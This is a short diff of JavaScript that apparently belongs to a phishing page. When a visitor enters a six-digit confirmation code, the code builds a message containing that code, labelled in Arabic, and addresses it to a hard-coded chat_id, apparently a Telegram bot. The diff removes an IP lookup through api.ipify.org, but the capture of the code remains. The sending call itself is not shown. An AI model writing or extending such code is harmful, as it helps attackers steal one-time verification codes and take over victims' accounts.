@@ -729,13 +729,12 @@ head.appendChild(script);
 
             if (code.length === 6) {
 
-                const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
 
                 const payload = {
 
                     chat_id: '6797351288',
 
-                    text: `رمز التأكيد: ${code}\nIP: ${ip}`
+                    text: `رمز التأكيد: ${code}\n`
 
                 };
 
